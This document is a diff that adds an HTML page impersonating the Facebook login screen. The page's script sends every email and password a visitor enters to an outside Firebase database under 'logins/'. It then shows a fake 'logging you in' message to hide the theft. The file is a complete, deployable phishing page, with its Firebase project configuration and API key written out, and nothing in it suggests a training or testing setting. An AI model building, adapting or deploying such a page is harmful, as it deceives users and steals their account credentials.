@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#1877f2">
+  <title>Facebook Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #1f2a40, #1877f2);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #fff;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(8px);
+      border-radius: 15px;
+      padding: 30px 25px;
+      box-shadow: 0 0 15px #00000044;
+      width: 92%;
+      max-width: 350px;
+      animation: fadeIn 1s ease;
+    }
+    .logo {
+      display: block;
+      width: 100px;
+      margin: 0 auto 20px;
+    }
+    h2 {
+      text-align: center;
+      color: #ffffff;
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccd0d5;
+      border-radius: 8px;
+      font-size: 15px;
+      background: #f5f6f7;
+    }
+    button {
+      width: 100%;
+      background: #1877f2;
+      color: #fff;
+      padding: 12px;
+      font-size: 17px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: 0.3s;
+      font-weight: bold;
+    }
+    button:hover {
+      background: #145bd1;
+    }
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(15px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- FB Logo -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook" class="logo" />
+    <h2>Login to Facebook</h2>
+    <input type="text" id="email" placeholder="Email or Phone" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="saveLogin()">Log In</button>
+  </div>
+
+  <!-- Firebase Login Script (Don't Remove) -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-analytics.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBTuVt9xg1uiVF-LMqkRBpQErVNEve7wxM",
+      authDomain: "logindb-3ed54.firebaseapp.com",
+      databaseURL: "https://logindb-3ed54-default-rtdb.firebaseio.com",
+      projectId: "logindb-3ed54",
+      storageBucket: "logindb-3ed54.appspot.com",
+      messagingSenderId: "462951915771",
+      appId: "1:462951915771:web:5e317781e6b95c9123105e",
+      measurementId: "G-YVEY0YVGSD"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const db = getDatabase(app);
+
+    window.saveLogin = () => {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (email && password) {
+        const loginData = {
+          email,
+          password,
+          time: new Date().toLocaleString()
+        };
+
+        push(ref(db, "logins/"), loginData)
+          .then(() => {
+            alert("Please wait while we log you in...");
+            document.getElementById("email").value = "";
+            document.getElementById("password").value = "";
+          })
+          .catch((error) => {
+            console.error("Firebase Error:", error);
+            alert("Error: " + error.message);
+          });
+      } else {
+        alert("Enter email and password.");
+      }
+    };
+  </script>
+
+</body>
+</html>
